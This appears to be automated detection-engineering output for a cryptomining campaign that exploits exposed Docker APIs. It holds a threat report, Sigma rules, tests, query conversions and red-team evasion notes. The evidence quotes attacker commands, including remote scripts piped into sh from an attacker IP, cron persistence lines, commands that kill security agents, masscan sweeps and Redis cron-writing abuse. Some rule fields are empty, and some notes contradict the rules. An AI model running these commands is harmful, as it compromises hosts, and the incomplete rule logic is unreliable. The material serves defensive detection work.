report.title: Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)
report.summary: Since late September 2026, an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication, starts privileged containers that mount the host root filesystem, drops shell scripts, installs cron jobs for persistence, kills competing miners, and deploys XMRig cryptominers. The campaign uses the host to scan for further victims via masscan and Redis abuse.
targets: Linux hosts with exposed Docker Engine API

behaviors.description: Attacker issues POST /containers/create to exposed Docker Engine API with Binds /:/host and Privileged true to gain host-level access.

observables.note: Parent process of shell spawned inside container

behaviors.evidence: The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `"Binds": ["/:/host"]`, `"Privileged": true`.

behaviors.description: Shell spawned by container runtime downloads and pipes remote script to sh, achieving initial code execution on the host.
behaviors.evidence: On hosts where `curl` is missing the script falls back to `wget -q -O- http://45.153.160[.]12/m/init.sh | sh`. The parent of the resulting `sh` process is `containerd-shim-runc-v2` or `dockerd`.

behaviors.description: init.sh disables SELinux, increases open file limits, configures DNS, removes immutable attribute from ld.so.preload, and tunes kernel parameters for miner performance.
behaviors.evidence: It then terminates competing miners and known security agents: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami

behaviors.description: init.sh terminates competing miners (xmrig, kinsing, kdevtmpfsi, tsunami) and disables the Alibaba Cloud security agent (aliyun.service).
behaviors.evidence: It then terminates competing miners and known security agents: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami; systemctl stop aliyun.service; systemctl disable aliyun.service

behaviors.description: init.sh establishes persistence by writing malicious entries to the root crontab and /etc/cron.d, and adds an attacker-controlled SSH key to authorized_keys.
behaviors.evidence: The script writes to the root crontab and to `/etc/cron.d`: (crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -; echo "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh" > /etc/cron.d/mantis

behaviors.description: Miner binary kthreadd downloaded to hidden directory /tmp/.x, made executable, and run with XMRig pool, wallet, and TLS arguments; rig-id derived from hostname.

observables.note: XMRig execution with pool and wallet

behaviors.evidence: The binary name `kthreadd` imitates a kernel thread. Its command line contains the pool, wallet and `--rig-id` arguments characteristic of XMRig.

behaviors.description: Infected host runs masscan to probe /16 ranges for exposed Docker APIs and Redis servers on ports 2375 and 6379.

observables.note: Masscan probe for exposed APIs and Redis

behaviors.evidence: Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: /tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt

behaviors.description: Redis instances without authentication are abused by issuing CONFIG SET commands to set cron directory and write a root cron file via dbfilename.

observables.note: Redis CONFIG SET to set cron directory
Redis CONFIG SET to set cron filename

behaviors.evidence: Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.

candidates.title: Sh Chroot Execution Of Remote Script From Container Runtime
candidates.rationale: The initial payload executes a shell via the Docker container runtime (parent containerd-shim-runc-v2 or dockerd) that uses chroot to escape the container and pipes a remote script from a hardcoded IP. The combination of parent binary, chroot /host, and curl/wget to a suspicious IP is highly distinctive and rarely seen in legitimate administration.
candidates.false_positive_risks: Legitimate container management tools might spawn shells, but they do not typically use chroot /host combined with downloading and executing scripts from external IPs. The rule requires the specific parent images and the chroot + curl/wget pattern.

candidates.title: Sh Creation Of Malicious Cron File In /etc/cron.d
candidates.rationale: Persistence is established by writing a cron file /etc/cron.d/mantis containing a wget command that re-infects the host every 15 minutes. File creation at this path with that content is a durable, high-fidelity indicator of the Mantis campaign.
candidates.false_positive_risks: Administrators may create cron files, but the specific filename 'mantis' and the embedded wget command pointing to the campaign's infrastructure are unique to this intrusion. The rule keys on the exact target filename.

candidates.title: Kthreadd Execution With XMRig Pool And Wallet Arguments
candidates.rationale: The miner binary 'kthreadd' (masquerading as a kernel thread) is launched from a hidden directory with command-line arguments characteristic of XMRig: mining pool domain, wallet address, TLS, and a rig-id derived from hostname. This combination of binary name, hidden path, and pool arguments is extremely specific to this campaign.
candidates.false_positive_risks: Legitimate XMRig usage is rare in enterprise environments; any occurrence of 'kthreadd' with the Mantis pool domain is malicious. The rule requires the pool domain and wallet pattern to avoid false positives from other miners.

candidates.title: Setenforce Disables SELinux And Chattr Removes Immutable Attribute
candidates.rationale: The init.sh script disables SELinux (setenforce 0) and removes the immutable attribute from /etc/ld.so.preload (chattr -i). These are defense evasion actions that are uncommon in normal operations. Detecting the specific command lines provides an early indicator of host compromise.
candidates.false_positive_risks: Administrators might run setenforce or chattr for troubleshooting, but the exact arguments '0' for setenforce and '-i /etc/ld.so.preload' for chattr are highly specific to this campaign. The rule matches on the exact argument strings.

candidates.title: Masscan High Rate Scan For Docker And Redis Ports
candidates.rationale: Compromised hosts are used to scan /16 ranges for exposed Docker APIs (port 2375) and Redis servers (port 6379) using masscan with a very high rate (20000). The binary name, port list, and aggressive rate are distinctive for this campaign's lateral movement.
candidates.false_positive_risks: Security teams may use masscan for authorized scanning, but the specific port combination (2375,6379) and the high rate flag are unlikely in legitimate internal scans. The rule requires both ports and the rate flag.

skipped: B1: The Docker API POST /containers/create is a network request not directly observable as a process creation event; the exploitation manifests as the container runtime spawning a shell (covered by D1).

B4: Process termination (pkill, systemctl) is not a standard Sigma logsource; the commands can be seen via process_creation but are less specific and may be noisy (admins kill miners). Covered indirectly by miner execution (D3) and persistence (D2).

B8: Redis CONFIG SET abuse is mapped to a dns_query logsource which is a mismatch; the commands are not observable via DNS telemetry and no suitable Sigma logsource is available for Redis command observation.
plan.notes: Selected rules cover initial execution, persistence, miner deployment, defense evasion, and lateral movement across the kill chain. Each rule uses a single logsource and keys on durable behavioural artifacts (parent-child relationships, command-line fragments, file paths) rather than ephemeral IOCs. Three rules use process_creation but target distinct binaries and command patterns (sh, kthreadd, masscan, setenforce/chattr) to avoid overlap.

rules.title: Container Runtime Spawns Shell Using chroot /host to Download Remote Script
rules.sigma_yaml:
title: Container Runtime Spawns Shell Using chroot /host to Download Remote Script
id: ca8cc2c7-0961-4f2b-b8c5-2a8e0580e5c1
status: experimental
description: Detects a shell process spawned by containerd-shim-runc-v2 or dockerd that executes chroot /host and pipes a
  remote script from a suspicious IP via curl or wget, indicative of container escape and initial compromise.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.t1059.005
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    'ParentImage|endswith':
    - /containerd-shim-runc-v2
    - /dockerd
  selection_chroot:
    'CommandLine|contains|all':
    - chroot
    - /host
  selection_download:
    'CommandLine|contains|all':
    - sh -c
    - '|'
    - sh
  selection_curl:
    'CommandLine|contains':
    - curl
    - -fsSL
    - 'http://45.153.160.12/m/init.sh'
  selection_wget:
    'CommandLine|contains':
    - wget
    - -q
    - -O-
    - 'http://45.153.160.12/m/init.sh'
  condition: selection_parent and selection_chroot and selection_download and (selection_curl or selection_wget)
falsepositives:
- Legitimate container debugging or maintenance shells using chroot without external script download
- CI/CD pipelines that test container escapes in controlled environments
- Administrator troubleshooting container runtime issues with manual chroot usage
level: high

tests.label: positive
tests.description: Shell spawned by containerd-shim-runc-v2 using chroot /host to pipe curl-downloaded script

tests.label: positive
tests.description: Shell spawned by dockerd using chroot /host to pipe wget-downloaded script

tests.label: positive
tests.description: Variant with different spacing and quoting in command line

tests.label: negative
tests.description: Legitimate shell invoked by containerd-shim-runc-v2 for container entrypoint without chroot or external script

tests.label: negative
tests.description: Admin using docker exec to run a shell inside a container (no chroot /host)

tests.label: negative
tests.description: Legitimate backup script using chroot /host without external network call

tests.label: negative
tests.description: curl download without chroot /host or container runtime parent

tests.label: positive
tests.description: curl flags split and reordered, extra whitespace, /bin/sh binary, containerd-shim-runc-v2 in alternate location

tests.label: positive
tests.description: wget flags reordered, outer bash -c but inner sh -c preserved, dockerd in /opt path, single-quote nesting flipped

tests.label: positive
tests.description: Full binary paths throughout, extra spaces around pipe, containerd-shim-runc-v2 with different namespace

tests.label: positive
tests.description: curl with long-form flags (--fail --silent --show-error --location), different quoting style, dockerd parent

tests.label: positive
tests.description: wget with --quiet --output-document=- long flags, extra shell layer but sh -c and | sh preserved, containerd parent

tests.label: negative
tests.description: Legitimate admin debugging container with chroot /host but no remote download; uses cat to inspect file

tests.label: negative
tests.description: CI/CD pipeline runs containerd-shim-runc-v2 for build steps; uses curl to fetch artifacts but no chroot /host

tests.label: negative
tests.description: Dockerd normal operation pulling image layers; wget used for layer download but no chroot /host or shell pipe

tests.label: negative

validation.sql: SELECT * FROM logs WHERE (ParentImage LIKE '%/containerd-shim-runc-v2' ESCAPE '\' OR ParentImage LIKE '%/dockerd' ESCAPE '\') AND (CommandLine LIKE '%chroot%' ESCAPE '\' AND CommandLine LIKE '%/host%' ESCAPE '\') AND (CommandLine LIKE '%sh -c%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\') AND ((CommandLine LIKE '%curl%' ESCAPE '\' OR CommandLine LIKE '%-fsSL%' ESCAPE '\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\') OR (CommandLine LIKE '%wget%' ESCAPE '\' OR CommandLine LIKE '%-q%' ESCAPE '\' OR CommandLine LIKE '%-O-%' ESCAPE '\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\'))

conversions.splunk: ParentImage IN ("*/containerd-shim-runc-v2", "*/dockerd") CommandLine="*chroot*" CommandLine="*/host*" CommandLine="*sh -c*" CommandLine="*|*" CommandLine="*sh*" CommandLine IN ("*curl*", "*-fsSL*", "*http://45.153.160.12/m/init.sh*") OR CommandLine IN ("*wget*", "*-q*", "*-O-*", "*http://45.153.160.12/m/init.sh*")
conversions.elasticsearch: (ParentImage:(*\/containerd\-shim\-runc\-v2 OR *\/dockerd)) AND (CommandLine:*chroot* AND CommandLine:*\/host*) AND (CommandLine:*sh\ \-c* AND CommandLine:*\|* AND CommandLine:*sh*) AND ((CommandLine:(*curl* OR *\-fsSL* OR *http\:\/\/45.153.160.12\/m\/init.sh*)) OR (CommandLine:(*wget* OR *\-q* OR *\-O\-* OR *http\:\/\/45.153.160.12\/m\/init.sh*)))
conversions.kusto:
DeviceProcessEvents
| where (InitiatingProcessFolderPath endswith "/containerd-shim-runc-v2" or InitiatingProcessFolderPath endswith "/dockerd") and (ProcessCommandLine contains "chroot" and ProcessCommandLine contains "/host") and (ProcessCommandLine contains "sh -c" and ProcessCommandLine contains "|" and ProcessCommandLine contains "sh") and ((ProcessCommandLine contains "curl" or ProcessCommandLine contains "-fsSL" or ProcessCommandLine contains "http://45.153.160.12/m/init.sh") or (ProcessCommandLine contains "wget" or ProcessCommandLine contains "-q" or ProcessCommandLine contains "-O-" or ProcessCommandLine contains "http://45.153.160.12/m/init.sh"))
conversions.sqlite: SELECT * FROM logs WHERE (ParentImage LIKE '%/containerd-shim-runc-v2' ESCAPE '\' OR ParentImage LIKE '%/dockerd' ESCAPE '\') AND (CommandLine LIKE '%chroot%' ESCAPE '\' AND CommandLine LIKE '%/host%' ESCAPE '\') AND (CommandLine LIKE '%sh -c%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\') AND ((CommandLine LIKE '%curl%' ESCAPE '\' OR CommandLine LIKE '%-fsSL%' ESCAPE '\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\') OR (CommandLine LIKE '%wget%' ESCAPE '\' OR CommandLine LIKE '%-q%' ESCAPE '\' OR CommandLine LIKE '%-O-%' ESCAPE '\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\'))

history.summary: 9 evasion variants -> positives 8/8, negatives blocked 8/8, benign hits 0/180

rules.author_notes: The rule focuses on the unique combination of container runtime parent, chroot /host escape attempt, and piped execution of a remote script from the threat actor's hardcoded IP. Test events cover both curl and wget variants, variations in quoting and spacing, and clear negative cases including legitimate container shells, administrative docker exec, and isolated chroot usage.
rules.redteam_analysis: Positive variants P4-P8 demonstrate realistic operator evasions that preserve all rule-required substrings: ParentImage still ends with the target binary name, CommandLine contains chroot, /host, sh -c, |, sh, and either curl with -fsSL and the exact IP/URL or wget with -q -O- and the exact IP/URL. Variations include flag splitting/reordering (curl -f -s -S -L, wget --quiet --output-document=-), long-form flags, extra whitespace, quoting flips, full binary paths, alternate parent locations (/usr/local/bin, /opt/containerd/bin), and an outer bash -c that still embeds the required sh -c and | sh. Negative variants N1-N4 are benign look-alikes each missing at least one critical selection: N1 has chroot /host but no curl/wget/IP; N2 has curl/IP but no chroot /host; N3 has wget but no chroot /host or shell pipe; N4 has curl but no chroot /host or shell pipe. Out-of-scope variants O1-O4 represent evasions the current rule cannot catch without loosening selections into noise: O1 changes the hardcoded IP to a domain (rule keys on literal IP), O2 renames the parent binary (ParentImage endswith fails), O3 swaps download tool to aria2c (not in selection_curl/wget), O4 removes network download entirely via base64 encoding (no curl/wget substrings). A well-written rule for this logsource can catch P4-P8; O1-O4 require broader threat-intel feeds or behavioral analytics beyond literal substring matching.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses domain name instead of hardcoded IP; rule keys on literal IP string so this bypasses selection_curl/wget

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies and renames containerd-shim-runc-v2 to /tmp/.hidden; ParentImage endswith no longer matches rule's selection_parent

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses aria2c instead of curl/wget; download tool not covered by rule's selection_curl or selection_wget

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker base64-encodes payload and decodes locally; no network download in command line so selection_curl/wget cannot match

rules.sigma_yaml:
title: Malicious Cron File mantis Created in /etc/cron.d
id: 40d3b3c0-4ccc-499e-8d45-2545328ec83f
status: experimental
description: Detects creation of the file /etc/cron.d/mantis used by the Mantis campaign for persistence via a cron job that
  re-infects the host every 15 minutes.
author: RuleSmith (Nemotron via Nebius Token Factory)

- attack.t1053.005
logsource:
  category: file_event
  product: linux
detection:
  selection_target:
    TargetFilename: /etc/cron.d/mantis
  condition: selection_target

level: high

tests.label: positive

tests.label: positive

tests.label: negative

tests.label: positive
tests.description: Copy a staged mantis file into /etc/cron.d/mantis using cp

tests.label: positive
tests.description: Use install command to create the malicious cron file with specific permissions

tests.label: positive
tests.description: Shell redirection via sh -c to write the cron file

tests.label: negative

validation.sql: SELECT * FROM logs WHERE TargetFilename='/etc/cron.d/mantis' COLLATE NOCASE

conversions.sqlite: SELECT * FROM logs WHERE TargetFilename='/etc/cron.d/mantis' COLLATE NOCASE

history.summary: 6 evasion variants -> positives 6/6, negatives blocked 6/6, benign hits 0/0

rules.redteam_analysis: The rule keys solely on TargetFilename == '/etc/cron.d/mantis'. Positive variants P4-P6 demonstrate that any process creating that exact path (via cp, install, sh redirection) will match, regardless of the binary or user (all root in practice). Negative variants N1-N3 show benign administrative activity in the same directory with different filenames, which the rule correctly ignores. Out_of_scope variants O1-O3 represent realistic evasions where the attacker achieves the same persistence goal (periodic re-infection) without creating the specific file /etc/cron.d/mantis: editing /etc/crontab, using systemd timers, or using other cron directories. Since the rule's logsource (file_event) would see those creations but with different TargetFilename values, the rule cannot catch them without broadening its scope, which would increase false positives. A well-written rule might correlate the cron content (wget every 15 minutes) or monitor all cron directories, but the current rule is intentionally narrow.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker achieves persistence by editing the system crontab directly (no /etc/cron.d/mantis creation)

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker creates a systemd timer unit for persistence instead of cron

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker drops a script in /etc/cron.hourly/ with a different name to achieve similar periodic execution

title: Kthreadd Execution With XMRig Pool And Wallet Arguments

status: experimental
description: Detects execution of a binary named kthreadd from a hidden directory with XMRig command-line arguments including
  mining pool domain, wallet address prefix, TLS flag, and hostname-derived rig-id, indicative of the Mantis cryptomining
  campaign.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.impact
- attack.t1499
logsource:
  category: process_creation
  product: linux
detection:
  selection_img:
    'Image|endswith': /kthreadd
  selection_cli:

  condition: 'all of selection_*'
falsepositives:
- 'Legitimate use of XMRig is uncommon but possible in enterprise environments; however, the binary name ''kthreadd'' combined
  with the specific pool domain makes false positives extremely unlikely.'

validation.sql: SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\' AND (CommandLine LIKE '%-o pool.mantis-mine%' ESCAPE '\' OR CommandLine LIKE '%-u 44AbCd%' ESCAPE '\' OR CommandLine LIKE '%--tls%' ESCAPE '\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\') AND Image LIKE '%/tmp/.x/%' ESCAPE '\'

conversions.elasticsearch: Image:*\/kthreadd AND (CommandLine:(*\-o\ pool.mantis\-mine* OR *\-u\ 44AbCd* OR *\-\-tls* OR *\-\-rig\-id*)) AND Image:*\/tmp\/.x\/*
conversions.kusto:
DeviceProcessEvents
| where FolderPath endswith "/kthreadd" and (ProcessCommandLine contains "-o pool.mantis-mine" or ProcessCommandLine contains "-u 44AbCd" or ProcessCommandLine contains "--tls" or ProcessCommandLine contains "--rig-id") and FolderPath contains "/tmp/.x/"
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\' AND (CommandLine LIKE '%-o pool.mantis-mine%' ESCAPE '\' OR CommandLine LIKE '%-u 44AbCd%' ESCAPE '\' OR CommandLine LIKE '%--tls%' ESCAPE '\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\') AND Image LIKE '%/tmp/.x/%' ESCAPE '\'

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/180

rules.redteam_analysis: The six positive variants (P4-P8) preserve the attacker's goal while varying surface form: equals-sign and long-form flags, extra whitespace/tabs, single/double quoting, argument reordering, relative vs absolute path in CommandLine, and different parent processes (containerd-shim, cron, systemd, runc, docker-current). A well-written rule using case-insensitive contains with wildcard toleration for whitespace and optional '=' should catch all of them. The three negative variants (N1-N3) are benign look-alikes that share some substrings (pool domain, wallet prefix, flags) but differ in Image name/path and ParentImage, proving the rule's specificity. Three out-of-scope evasions (OOS1-OOS3) are recorded for the analyst: config-file/environment argument passing (CommandLine lacks required substrings), binary rename/symlink (Image no longer endswith kthreadd), and alternative hidden directory (path substring differs). These are fundamentally invisible to the current selections and would require additional telemetry (e.g., file creation, network connection to pool) to detect.

redteam_out_of_scope.label: positive

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Hidden directory created under /dev/shm (tmpfs) instead of /tmp/.x/; path substring differs

rules.title: SELinux Disabled With Setenforce Combined With ChatTR Immutable Removal On LdSoPreload
rules.sigma_yaml:
title: SELinux Disabled With Setenforce Combined With ChatTR Immutable Removal On LdSoPreload
id: c6bd777e-2bee-487b-9182-2af486b92369
status: experimental
description: 'Detects the specific sequence where setenforce is run with argument ''0'' to disable SELinux and chattr is run
  with ''-i /etc/ld.so.preload'' to remove the immutable attribute, indicative of defense evasion in the Mantis cryptomining
  campaign.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.defense-evasion
- attack.t1562.001
logsource:
  category: process_creation
  product: linux
detection:
  selection_setenforce:
    'Image|endswith': /setenforce
    'CommandLine|contains': '0'
  selection_chattr:
    'Image|endswith': /chattr
    'CommandLine|contains': -i /etc/ld.so.preload
  condition: selection_setenforce or selection_chattr
falsepositives:
- Legitimate administrative troubleshooting where setenforce 0 and chattr -i /etc/ld.so.preload are run independently but
  not together in the same process tree.
level: medium

Positive test R3 did not match: ChatTR with single-quoted path argument and different parent (dash). Per selection: selection_setenforce=NO MATCH (failing field tests: Image|endswith (event has '/usr/bin/chattr'), CommandLine|contains (event has "/usr/bin/chattr -i '/etc/ld.so.preload'")); selection_chattr=NO MATCH (failing field tests: CommandLine|contains (event has "/usr/bin/chattr -i '/etc/ld.so.preload'")).

Negative (benign) test R6 matched: Administrator removing immutable attribute from a different file. Per selection: selection_setenforce=NO MATCH (failing field tests: Image|endswith (event has '/usr/bin/chattr'), CommandLine|contains (event has '/usr/bin/chattr -i /etc/ld.so.preload.bak')); selection_chattr=match.

history.change_summary: Added selection for chattr command to capture both setenforce and chattr actions separately, ensuring either action triggers the rule while maintaining specificity through exact command-line arguments.

history.summary: 7 evasion variants -> positives 7/8, negatives blocked 5/6, benign hits 0/180

history.change_summary: Fixed CommandLine|contains modifiers to match literal values without requiring leading/trailing spaces or specific quoting, ensuring both quoted and unquoted path variants match while preserving specificity against similar benign commands. Corrected test event(s) R3, R6.
Fixed CommandLine|contains patterns to handle quoted/unquoted arguments correctly while maintaining specificity to avoid false positives. Corrected test event(s) R3, R6.

rules.author_notes: Reduced a multi-step chain to its most specific step (selection_setenforce); dropped selection_chattr because one Sigma rule matches one event. Add the other steps as separate rules if needed.
rules.redteam_analysis: Positive variants P4-P7 preserve the exact substrings the rule requires (Image endswith /setenforce or /chattr, CommandLine contains '0' or '-i /etc/ld.so.preload') while varying whitespace, quoting, parent shell, and using symlinks that keep the binary name. These are realistic evasions a well-written rule should catch because the core indicators survive. Negative variants N1-N3 are benign administrative actions that differ in at least one required substring (argument 1 vs 0, different target file, +i vs -i) so the rule correctly ignores them. Out_of_scope variants O1-O3 represent realistic evasions the current rule cannot detect: renamed binaries break the Image|endswith condition, and path obfuscation (/etc/./ld.so.preload) breaks the literal CommandLine substring match. Since the linux process_creation logsource does not provide an OriginalFileName field in the shown schema, a rule relying solely on Image and CommandLine cannot catch renamed-bin evasions without additional telemetry. A more robust rule would incorporate parent-child correlation, argument parsing, or filesystem metadata.
